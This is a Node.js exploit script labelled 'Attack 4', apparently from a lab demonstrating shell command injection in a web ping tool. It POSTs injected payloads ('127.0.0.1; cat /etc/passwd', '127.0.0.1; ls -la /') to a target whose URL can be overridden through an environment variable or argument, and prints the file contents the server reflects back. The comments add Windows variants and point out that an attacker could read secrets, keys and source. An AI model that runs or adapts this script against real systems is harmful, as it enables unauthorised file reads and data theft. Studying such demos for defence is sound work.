/*
 * ATTACK 4 — Data exfiltration / file read
 * -----------------------------------------------------------------------------
 * Technique: chain a command that reads a sensitive file and, because the
 *   vulnerable server reflects output, read it straight out of the response.
 *   Classic demo target on Linux is /etc/passwd (world-readable, harmless, but
 *   proves arbitrary file read). We also list a directory to show scope.
 *   (Windows equivalent: `& type C:\Windows\win.ini` or `& dir C:\`.)
 *
 * Root cause: same shell injection as the other attacks; the real-world IMPACT
 *   is what changes — an attacker can read app secrets, keys, config, source.
 *
 * Proof: the contents of /etc/passwd (lines like `root:x:0:0:...`) appear in
 *   the response — data the ping tool would never produce.
 *
 * Usage: see attack 1 (TARGET env / argv override).
 */

const TARGET = process.env.TARGET || process.argv[2] || 'http://localhost:3000';

const payloads = [
  '127.0.0.1; cat /etc/passwd',
  '127.0.0.1; ls -la /',
];

async function run(payload) {
  console.log('\n────────────────────────────────────────────────────────');
  console.log('PAYLOAD (host field):', JSON.stringify(payload));
  const res = await fetch(`${TARGET}/ping`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ host: payload }),
  });
  const html = await res.text();
  console.log('HTTP status:', res.status);
  console.log('--- server response (output + error blocks) ---');
  console.log(extractBlocks(html));
}

function extractBlocks(html) {
  const blocks = [...html.matchAll(/<pre[^>]*>([\s\S]*?)<\/pre>/g)].map(m =>
    m[1].replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').trim()
  );
  return blocks.length ? blocks.join('\n---\n') : '(no <pre> output block in response)';
}

(async () => {
  console.log('== Attack 4: data exfiltration / file read ==');
  console.log('Target:', TARGET);
  for (const p of payloads) {
    try { await run(p); } catch (e) { console.error('request failed:', e.message); }
  }
})();
